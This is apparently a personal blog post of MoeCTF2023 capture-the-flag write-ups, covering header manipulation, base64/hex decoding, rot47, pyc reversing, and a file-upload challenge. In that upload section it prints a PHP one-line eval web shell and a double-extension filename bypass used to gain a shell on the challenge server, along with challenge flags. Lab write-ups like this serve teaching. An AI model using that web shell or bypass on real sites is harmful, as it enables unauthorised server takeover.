+++
date = '2023-08-19T12:13:00+08:00'
draft = false
title = 'Moectf2023的一些wp（已废弃）'
tags = ['ctf']
categories = ['ctf']
+++

# MoeCTF2023 WP

@author：lamaper

@email：lamaper@qq.com

2023/8/19 12:13

## Web

### 1.http

按照要求修改请求头

```
POST www.xxx.com/?UwU=u HTTP/1.1
Host: localhost:1189
User-Agent: MoeBrowser
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 5
Origin: http://localhost:1189
Connection: keep-alive
Referer: 127.0.0.1
X-Forwarded-For:127.0.0.1
Cookie: character=admin
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```

### 2.入门指北

原始文本

```
666c61673d6257396c5933526d6533637a62454e7662575666564739666257396c5131524758316379596c396a61474673624756755a3055684958303d
```

观察知道是hex，遂解码

```
flag=bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0=
```

观察知道是base64加密，遂解密

```
moectf{w3lCome_To_moeCTF_W2b_challengE!!}
```

### 3.彼岸的flag

F12看源码，flag藏在注释里

### *4.Cookie

摸不着头脑

### 5.gas!gas!gas!

先看js

```

```

### 6.moe图床

F12发现有段js

```javascript
<script>
        function uploadFile() {
            const fileInput = document.getElementById('fileInput');
            const file = fileInput.files[0];
            
            if (!file) {
                alert('请选择一个文件进行上传！');
                return;
            }
            
            const allowedExtensions = ['png'];
            const fileExtension = file.name.split('.').pop().toLowerCase();
            if (!allowedExtensions.includes(fileExtension)) {
                alert('只允许上传后缀名为png的文件！');
                return;
            }
            
            const formData = new FormData();
            formData.append('file', file);

            fetch('upload.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(result => {
                if (result.success) {
                    const uploadResult = document.getElementById('uploadResult');
                    const para = document.createElement('p');
                    para.textContent = ('地址：');
                    const link = document.createElement('a');
                    link.textContent = result.file_path;
                    link.href = result.file_path;
                    link.target = '_blank';
                    para.append(link);
                    uploadResult.appendChild(para);

                    alert('文件上传成功！');
                } else {
                    alert('文件上传失败：' + result.message);
                }
            })
            .catch(error => {
                console.error('文件上传失败:', error);
            });
        }
```

遂转到`http://....../upload.php`

```php
 <?php
$targetDir = 'uploads/';
$allowedExtensions = ['png'];


if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $tmp_path = $_FILES['file']['tmp_name'];

    if ($file['type'] !== 'image/png') {//类型必须是image/png
        die(json_encode(['success' => false, 'message' => '文件类型不符合要求']));
    }

    if (filesize($tmp_path) > 512 * 1024) {//大小有限制
        die(json_encode(['success' => false, 'message' => '文件太大']));
    }

    $fileName = $file['name'];
    $fileNameParts = explode('.', $fileName);//分割文件名
/*
test.png.php
fileNameParts[0] = 'test'
fileNameParts[1] = 'png' = $secondSegment
fileNameParts[2] = 'php'
*/
    if (count($fileNameParts) >= 2) {//文件必须有扩展名
        $secondSegment = $fileNameParts[1];//第二段
        if ($secondSegment !== 'png') {//不是png
            die(json_encode(['success' => false, 'message' => '文件后缀不符合要求']));
        }
    } else {
        die(json_encode(['success' => false, 'message' => '文件后缀不符合要求']));
    }

    $uploadFilePath = dirname(__FILE__) . '/' . $targetDir . basename($file['name']);

    if (move_uploaded_file($tmp_path, $uploadFilePath)) {
        die(json_encode(['success' => true, 'file_path' => $uploadFilePath]));
    } else {
        die(json_encode(['success' => false, 'message' => '文件上传失败']));
    }
}
else{
    highlight_file(__FILE__);
}
?>

```

所以构建`a.png.php`

```php
<?php
	eval(@$_POST['password']);
?>
```

上传到`/var/www/html/uploads/a.png.php`，但实际上对应的网址是`http://xxx.xxx.xxx/uploads/a.png.php`

之后使用中国蚁剑链接，在根目录下找到flag`moectf{hmmm_improper_filter_ETZzkuWbtpEvHgwPhbdIlaP6TSSNrHE7}`



## Base

### 1.CCCCC

打开Dev-cpp运行一下

### 2.Python

python运行一下

### 3.runme

cmd/powershell直接调用 `.\runme.exe`

## Misc

### 1.入门

观察得base64加密，遂解密

```
moectf{h@v3_fun_@t_m15c_!}
```

## CLassical Crypto

### 1.ezrot

rot47加密，在线解密即可

## Reverse

### 2.base_64

首先进行pyc反编译

```python
#!/usr/bin/env python
# visit https://tool.lu/pyc/ for more information
# Version: Python 3.7

import base64
from string import *
str1 = 'yD9oB3Inv3YAB19YynIuJnUaAGB0um0='
string1 = 'ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0123456789+/'
string2 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
flag = input('welcome to moectf\ninput your flag and I wiil check it:')
enc_flag = base64.b64encode(flag.encode()).decode()
enc_flag = enc_flag.translate(str.maketrans(string2, string1))
if enc_flag == str1:
    print('good job!!!!')
else:
    print('something wrong???')
    exit(0)

```

string1和string2有唯一映射关系，将str1中的字符用string2的字符替换，得到

```
bW9lY3Rme3BZY19BbmRFQmFzZTY0fn0=
```

base64解密得到

```
moectf{pYc_AndEBase64~}
```

